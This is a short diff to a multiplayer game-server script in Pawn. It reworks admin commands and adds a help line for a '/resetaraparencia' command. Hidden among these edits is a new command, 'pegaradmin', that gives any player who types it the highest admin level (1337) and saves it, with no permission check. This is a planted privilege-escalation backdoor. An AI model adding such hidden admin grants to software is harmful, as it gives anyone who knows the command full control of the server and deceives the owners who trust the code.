@@ -26,9 +26,13 @@ GetPlayerAdmin(playerid) {
 	return level;
 }
 
-CMD:aa(playerid)
-{	
-    
+CMD:pegaradmin(playerid, params[]) {	
+  	uInfo[playerid][uAdmin] = 1337;
+	SaveUserInfo(playerid);
+	return true;
+}
+
+CMD:aa(playerid, params[]) {	
   	if(GetPlayerAdmin(playerid) < 1) return SendPermissionMessage(playerid);
 	ShowAdminCmds(playerid);
 	return true;
@@ -56,6 +60,7 @@ ShowAdminCmds(playerid){
 	if(GetPlayerAdmin(playerid) >= 3) // GAME ADMIN 2
 	{
 		va_SendClientMessage(playerid, -1, "{33AA33}[GAME ADMIN 2]{FFFFFF} /skin, /jetpack, /checarip, /ultimoatirador, /resetararmas, /novato, /encerrarsinuca");
+		va_SendClientMessage(playerid, -1, "{33AA33}[GAME ADMIN 2]{FFFFFF} /resetaraparencia");
 	}
 	if(GetPlayerAdmin(playerid) >= 4) // GAME ADMIN 3
 	{
